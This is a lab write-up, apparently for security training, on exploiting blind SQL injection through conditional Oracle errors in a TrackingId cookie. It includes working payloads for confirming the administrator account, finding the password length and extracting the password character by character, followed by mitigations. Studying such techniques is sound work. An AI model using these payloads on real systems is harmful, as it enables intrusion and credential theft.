# Blind SQL Injection with Conditional Errors

## Overview

This lab demonstrates how Blind SQL Injection can be exploited using conditional database errors. Unlike boolean-based blind SQL Injection, where the application's response changes based on TRUE or FALSE conditions, this technique relies on intentionally triggering database errors only when a specified condition evaluates to TRUE. By observing whether an error occurs, sensitive information can be inferred one character at a time.

## Objective

Determine the administrator's password by exploiting Blind SQL Injection with conditional errors and use it to log in as the administrator.

## Vulnerability

The application was vulnerable to SQL Injection through the `TrackingId` cookie.

**Vulnerable Parameter:**

```http
Cookie: TrackingId=<value>
```

The application incorporated the cookie value directly into an SQL query without proper sanitization.

## Methodology

### Step 1: Verify SQL Injection

A single quote was appended to the TrackingId cookie.

Payload:

```sql
'
```

### Observation

The application generated a database error.

### Conclusion

The TrackingId cookie was vulnerable to SQL Injection.

---

### Step 2: Verify Conditional Error Generation

A CASE expression was used to intentionally generate an error only when a condition evaluated to TRUE.

Payload:

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

### Observation

A database error was returned.

The condition was then modified:

```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

### Observation

No database error occurred.

### Conclusion

The application's behavior depended on whether the injected condition evaluated to TRUE or FALSE.

---

### Step 3: Confirm the Administrator User Exists

Payload:

```sql
'||(SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```

### Observation

A database error was generated.

### Conclusion

The administrator account exists within the database.

---

### Step 4: Determine the Password Length

The LENGTH() function was used to determine the administrator password length.

Example Payload:

```sql
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```

### Observation

An error occurred only when the tested password length matched the actual length.

### Conclusion

The administrator password length was successfully identified.

---

### Step 5: Extract the Password

The SUBSTR() function was used to test each character of the password individually.

Example Payload:

```sql
'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```

Each character position was tested until the complete administrator password was recovered.

---

### Step 6: Log In as Administrator

The extracted administrator password was used to authenticate to the application.

## Result

Successfully extracted the administrator password through conditional database errors and logged in as the administrator.

## Why It Worked

Although the application did not reveal query results, it exposed database errors. By using a CASE expression to intentionally perform an invalid operation (`1/0`) only when a condition evaluated to TRUE, it was possible to distinguish between TRUE and FALSE conditions. Repeating this process allowed sensitive information to be extracted one character at a time.

## Impact

An attacker may be able to:

- Infer sensitive database information
- Extract usernames and passwords
- Enumerate database contents
- Compromise administrator accounts
- Gain unauthorized access to application functionality

## Mitigation

- Use parameterized queries (prepared statements)
- Avoid constructing SQL queries using user input
- Suppress verbose database errors
- Validate and sanitize user input
- Apply the principle of least privilege
- Conduct regular security testing

## Key Concepts Learned

- Blind SQL Injection
- Conditional Errors
- CASE Expression
- Oracle Error Generation
- LENGTH() Function
- SUBSTR() Function
- Character-by-Character Data Extraction

## Tools Used

- Burp Suite Repeater
- Browser Developer Tools

## Conclusion

This lab demonstrated how attackers can exploit conditional database errors to extract sensitive information even when query results are not displayed. By intentionally generating errors only when specific conditions evaluated to TRUE, it was possible to infer the administrator password and gain unauthorized access to the application.
